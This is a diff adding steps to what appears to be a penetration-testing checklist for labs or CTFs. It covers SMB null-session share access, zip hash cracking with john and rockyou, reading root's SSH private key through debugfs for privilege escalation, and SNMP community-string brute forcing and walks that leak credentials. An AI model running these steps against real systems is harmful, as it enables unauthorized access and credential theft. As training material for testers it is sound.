@@ -15,6 +15,31 @@
   smbclient -L //<target> -N
   smbclient -L //<target> -U guest%
   smbclient -L //<TARGET_IP>/ --no-pass
+
+  #Found an interesting share? Try connecting to it.
+  smbclient //TARGET_IP/Share name --no-pass
+
+  #Connected?
+  dir
+  get <filename.zip>
+
+  #If it is a zip, you can extract it
+  7z x emails.zip
+
+  #Password protected?
+  zip2john FILENAME.zip | tee CHOSEN_FILE_NAME_hash
+
+  #Crack some hashes
+  john CHOSEN_FILE_NAME --wordlist=/usr/share/wordlists/rockyou.txt
+  
+  #Unzip the file again and input pass
+  7z x FILENAME.zip
+
+  #Inspect files
+  cd
+  cat
+  ls -lart
+
   ```
 - [ ] **Comprehensive SMB Enum**:
   ```bash
@@ -122,6 +147,37 @@ run
 - [ ] **Check for default or easy creds manually**
   ```bash
   ssh <USERNAME>@<TARGET_IP>
+
+  #Logged in?
+  
+  #Upgrade Shell for ease of use
+  /bin/bash
+  id
+
+  #Annotate groups
+  Example: uid-1000(franky) gid=1000(franky) groups=1000(franky),4(homebase)
+
+  #Inspect the disk space summary usage for each mounted file
+  df -h
+
+  #focus on is where the root filesystem is mounted IE: "/"
+  #examine this partition where it will potentially allow us to create/read directory contents
+  debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+
+  #test our permissions
+  mkdir test
+
+  #Is it Read/only? Check for root SSH key
+  cat /root/.ssh/id_rsa
+
+  #Copy key and change its permissions
+  chmod 600 id_rsa
+
+  #Confirm permission change
+  ls -lart id_rsa
+
+  #Log in as root or user
+  ssh -i id_rsa root@<Target IP>
   ```
 - [ ] **Check for authorized SSH keys or reuse**
   ```bash
@@ -275,6 +331,7 @@ run
   ```bash
   #If onesixtyone is not installed/working:
   sudo apt install onesixtyone
+
   #Then run
   onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <TARGET_IP>
   onesixtyone -c /usr/share/metasploit-framework/data/wordlists/nmp_default_pass.txt <TARGET_IP>
@@ -287,6 +344,8 @@ run
   ```bash
   #First make sure you have snmp mibs installed:
   sudo apt-get install snmp-mibs-downloader
+    #Edit file and add hashtag "#" on mibs line: "#mibs :"
+  sudo nano /etc/snmp/.conf
   #then
   snmpwalk -v2c -c `<COMMUNITY_STRING>` <TARGET_IP>
   #or
@@ -332,13 +391,14 @@ run
   NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."passwd" = STRING: /bin/cat /root/creds.txt
   NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."status" = STRING: /usr/bin/uptime
 
-- [ ] **Get Output of Extended SNMP Commands**:
+- [ ] ***Get Output of Extended SNMP Commands**:
   ```bash
   snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
   #ExampleResults:
   NET-SNMP-EXTEND-MIB::nsExtendOutputFull."passwd" = STRING: bobby:NOTaRealPassword
   NET-SNMP-EXTEND-MIB::nsExtendOutputFull."status" = STRING: 01:42:30 up 4 days, 3:44, 2 users, load average: 0.02, 0.04, 0.05
-- [ ] **  Walk the Entire SNMP Tree (Full OID Fuzz)**:
+
+- [ ] ***Walk the Entire SNMP Tree (Full OID Fuzz)***:
   ```bash
   snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1
   #Example Results:
